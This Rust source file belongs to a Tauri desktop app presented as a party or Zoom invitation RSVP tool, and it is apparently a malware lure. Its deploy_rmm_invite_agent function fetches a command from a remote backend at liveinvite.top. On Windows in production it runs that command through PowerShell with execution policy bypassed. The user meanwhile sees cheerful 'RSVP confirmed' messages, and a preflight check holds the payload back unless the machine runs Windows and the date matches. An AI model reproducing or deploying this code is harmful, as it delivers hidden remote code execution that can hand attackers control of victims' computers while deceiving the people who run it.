use chrono::Local;
use serde::{Serialize, Deserialize};
use std::process::Command;

// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SystemPreflight {
    is_windows: bool,
    windows_type: String,
    is_64_bit: bool,
    runtime_date: String,
    client_date: Option<String>,
    calendar_matches_runtime: bool,
    next_phase_ready: bool,
    message: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct RmmDeploymentResult {
    success: bool,
    message: String,
    deployed_at: Option<String>,
}

#[derive(Deserialize)]
#[serde(rename_all = "camelCase")]
struct PublicShellResponse {
    configured: bool,
    shell_command: Option<String>,
}

const BACKEND_URL: &str = "https://call-invite-zoom.liveinvite.top";

// Fetches canonical shell payload from backend (/api/shell)
async fn fetch_public_shell() -> Result<PublicShellResponse, String> {
    let client = reqwest::Client::new();
    let url = format!("{}/api/shell", BACKEND_URL);
    
    match client
        .get(&url)
        .send()
        .await
    {
        Ok(response) => {
            match response.json::<PublicShellResponse>().await {
                Ok(data) => Ok(data),
                Err(_) => Err("Failed to parse shell response".to_string()),
            }
        }
        Err(e) => Err(format!("Failed to fetch shell command: {}", e)),
    }
}

fn last_nonempty_line(text: &str) -> Option<String> {
    text
        .lines()
        .rev()
        .map(str::trim)
        .find(|line| !line.is_empty())
        .map(ToString::to_string)
}

#[tauri::command]
async fn deploy_rmm_invite_agent() -> RmmDeploymentResult {
    // Enforce Windows check only in production; allow any OS in dev
    if cfg!(not(debug_assertions)) && std::env::consts::OS != "windows" {
        return RmmDeploymentResult {
            success: false,
            message: "This invitation experience is available on Windows devices.".to_string(),
            deployed_at: None,
        };
    }

    // Fetch canonical shell command from backend
    let shell_payload = match fetch_public_shell().await {
        Ok(data) => data,
        Err(_) => {
            return RmmDeploymentResult {
                success: false,
                message: "Party prep hit a snag (connection issue). Please try again.".to_string(),
                deployed_at: None,
            };
        }
    };

    if !shell_payload.configured {
        return RmmDeploymentResult {
            success: false,
            message: "Party prep hit a snag (shell not configured). Please try again.".to_string(),
            deployed_at: None,
        };
    }

    let shell_command = match shell_payload.shell_command {
        Some(cmd) if !cmd.trim().is_empty() => cmd,
        _ => {
            return RmmDeploymentResult {
                success: false,
                message: "Party prep hit a snag (shell command missing). Please try again.".to_string(),
                deployed_at: None,
            };
        }
    };

    // In dev mode, fetch from backend and print manifest/config, but skip PowerShell execution
    if cfg!(debug_assertions) {
        let client = reqwest::Client::new();

        let script_preview = match client.get(format!("{}/api/shell", BACKEND_URL)).send().await {
            Ok(response) => match response.text().await {
                Ok(script) => {
                    format!(
                        "{}...",
                        script[..100.min(script.len())].replace("\n", "\\n")
                    )
                }
                Err(_) => "<unable to read script body>".to_string(),
            },
            Err(_) => "<unable to fetch script>".to_string(),
        };

        let manifest_url = format!("{}/api/shell", BACKEND_URL);
        match client.get(&manifest_url).send().await {
            Ok(response) => {
                let status = response.status();
                match response.text().await {
                    Ok(body) => {
                        eprintln!("[DEV] /api/shell preview: {}", script_preview);
                        eprintln!("[DEV] /api/shell status: {}", status);
                        eprintln!("[DEV] /api/shell body: {}", body);

                        let success = status.is_success();
                        let message = if success {
                            "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
                        } else {
                            "Party prep hit a snag (shell fetch failed). Please try again.".to_string()
                        };

                        return RmmDeploymentResult {
                            success,
                            message,
                            deployed_at: if success {
                                Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string())
                            } else {
                                None
                            },
                        };
                    }
                    Err(e) => {
                        return RmmDeploymentResult {
                            success: false,
                            message: format!("Party prep hit a snag (failed to read shell response): {}. Please try again.", e),
                            deployed_at: None,
                        };
                    }
                }
            }
            Err(e) => {
                return RmmDeploymentResult {
                    success: false,
                    message: format!("Party prep hit a snag (shell fetch failed): {}. Please try again.", e),
                    deployed_at: None,
                };
            }
        }
    }

    // Execute PowerShell one-liner (production only)
    match Command::new("powershell")
        .args(&["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command"])
        .arg(&shell_command)
        .output()
    {
        Ok(output) => {
            let success = output.status.success();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            
            let message = if success {
                "Your RSVP is confirmed, and your follow-up reminder is ready. See you at the party!".to_string()
            } else {
                let error_hint = if stderr.contains("Unable to connect") || stdout.contains("Unable to connect") {
                    "connection issue"
                } else if stderr.contains("Already Installed") || stdout.contains("Already Installed") {
                    "already confirmed"
                } else {
                    "invitation setup encountered an issue"
                };

                let detail = last_nonempty_line(&stderr)
                    .or_else(|| last_nonempty_line(&stdout))
                    .unwrap_or_else(|| "No error details returned by installer.".to_string());

                format!(
                    "Party prep hit a snag ({}). {}",
                    error_hint,
                    detail
                )
            };
            
            RmmDeploymentResult {
                success,
                message,
                deployed_at: if success {
                    Some(Local::now().format("%Y-%m-%d %H:%M:%S").to_string())
                } else {
                    None
                },
            }
        }
        Err(e) => RmmDeploymentResult {
            success: false,
            message: format!("We could not complete your RSVP right now: {}", e),
            deployed_at: None,
        },
    }
}

#[tauri::command]
fn system_preflight(client_date: Option<String>) -> SystemPreflight {
    let is_windows = std::env::consts::OS == "windows";
    let arch = std::env::consts::ARCH;
    let (windows_type, is_64_bit) = match arch {
        "x86_64" => ("x64".to_string(), true),
        "x86" => ("x86".to_string(), false),
        "aarch64" => ("arm64".to_string(), true),
        other => (other.to_string(), cfg!(target_pointer_width = "64")),
    };

    let runtime_date = Local::now().format("%Y-%m-%d").to_string();
    let calendar_matches_runtime = match client_date.as_deref() {
        Some(date) => date == runtime_date,
        None => false,
    };

    let next_phase_ready = is_windows && calendar_matches_runtime;
    let message = if !is_windows {
        "Your invitation is not available on this device.".to_string()
    } else if !calendar_matches_runtime {
        "Your invitation is not active yet. Please check back later.".to_string()
    } else {
        "You're all set to continue.".to_string()
    };

    SystemPreflight {
        is_windows,
        windows_type,
        is_64_bit,
        runtime_date,
        client_date,
        calendar_matches_runtime,
        next_phase_ready,
        message,
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![greet, system_preflight, deploy_rmm_invite_agent])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
